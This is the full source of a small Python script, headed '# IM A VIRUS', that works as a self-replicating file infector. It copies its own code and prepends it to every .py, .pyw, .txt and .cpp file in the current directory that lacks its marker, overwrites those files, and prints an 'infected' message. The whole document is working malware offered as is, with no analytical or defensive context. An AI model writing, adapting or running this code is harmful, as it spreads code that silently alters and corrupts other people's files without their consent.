# IM A VIRUS

import sys
import glob

code = []

with open(sys.argv[0], 'r') as file:
    lines = file.readlines()

self_replicating = False
for each in lines:
    if each == "# IM A VIRUS":
        self_replicating = True
    if not self_replicating:
        code.append(each)
    if each == "# SEE YA LATER!\n":
        break

files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt') + glob.glob('*.cpp')

for check in files:
    with open(check, 'r') as file:
        code_file = file.readlines()

    infected = False

    for every in code_file:
        if every == "# IM A VIRUS\n":
            infected = True
            break

    if not infected:
        final = []
        final.extend(code)
        final.extend('\n')
        final.extend(code_file)

        with open(check, 'w') as file:
            file.writelines(final)


def malware():
    print("bro you've just been infected")


malware()


# SEE YA LATER!